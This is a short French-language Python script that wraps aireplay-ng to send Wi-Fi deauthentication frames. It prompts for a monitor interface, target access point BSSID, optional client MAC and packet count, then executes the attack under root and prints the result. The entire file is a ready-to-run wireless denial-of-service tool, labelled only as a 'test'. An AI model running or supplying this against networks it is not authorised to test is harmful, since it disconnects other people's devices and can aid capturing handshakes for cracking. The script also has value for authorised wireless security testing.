#!/usr/bin/env python3
"""
Test simple de déauthentification
"""

import subprocess
import time
import sys
from colorama import init, Fore, Style

init(autoreset=True)

def test_deauth_simple():
    """Test simple sans modules complexes"""
    print(f"{Fore.CYAN}[*] Test de déauthentification simple")
    
    # Demander les paramètres
    interface = input(f"{Fore.YELLOW}[?] Interface monitor (ex: wlan0mon): ").strip()
    bssid = input(f"{Fore.YELLOW}[?] BSSID du point d'accès: ").strip()
    channel = input(f"{Fore.YELLOW}[?] Canal (laisser vide si inconnu): ").strip()
    client = input(f"{Fore.YELLOW}[?] MAC du client (vide pour broadcast): ").strip()
    count = input(f"{Fore.YELLOW}[?] Nombre de paquets [10]: ").strip() or "10"
    
    # Construire la commande
    cmd = ['aireplay-ng', '--deauth', count, '-a', bssid]
    
    if client:
        cmd.extend(['-c', client])
    
    if channel:
        cmd.extend(['--channel', channel])
    
    cmd.append(interface)
    
    print(f"\n{Fore.CYAN}[*] Commande: {' '.join(cmd)}")
    print(f"{Fore.YELLOW}[!] Appuyez sur Ctrl+C pour arrêter")
    
    try:
        # Exécuter
        result = subprocess.run(cmd,
                              capture_output=True,
                              text=True,
                              timeout=30)
        
        print(f"\n{Fore.CYAN}[*] Sortie:")
        print(result.stdout)
        
        if result.returncode == 0:
            print(f"{Fore.GREEN}[✓] Succès!")
        else:
            print(f"{Fore.RED}[✗] Erreur: {result.stderr[:200]}")
            
    except subprocess.TimeoutExpired:
        print(f"{Fore.YELLOW}[!] Timeout")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrompu")
    except Exception as e:
        print(f"{Fore.RED}[✗] Erreur: {e}")

def main():
    """Menu principal"""
    if os.geteuid() != 0:
        print(f"{Fore.RED}[✗] Exécutez avec sudo")
        sys.exit(1)
    
    while True:
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW} TEST DÉAUTHENTIFICATION")
        print(f"{Fore.CYAN}{'='*60}")
        
        print(f"\n{Fore.CYAN}[1] Tester la déauthentification")
        print(f"{Fore.CYAN}[2] Voir les interfaces")
        print(f"{Fore.CYAN}[3] Quitter")
        
        choix = input(f"\n{Fore.YELLOW}[?] Votre choix: ").strip()
        
        if choix == '1':
            test_deauth_simple()
            input(f"\n{Fore.CYAN}[?] Appuyez sur Entrée...")
        elif choix == '2':
            print(f"\n{Fore.CYAN}[*] Interfaces:")
            subprocess.run(['iwconfig'])
            input(f"\n{Fore.CYAN}[?] Appuyez sur Entrée...")
        elif choix == '3':
            print(f"\n{Fore.YELLOW}[*] Au revoir!")
            break
        else:
            print(f"{Fore.RED}[✗] Choix invalide")

if __name__ == "__main__":
    import os
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrompu")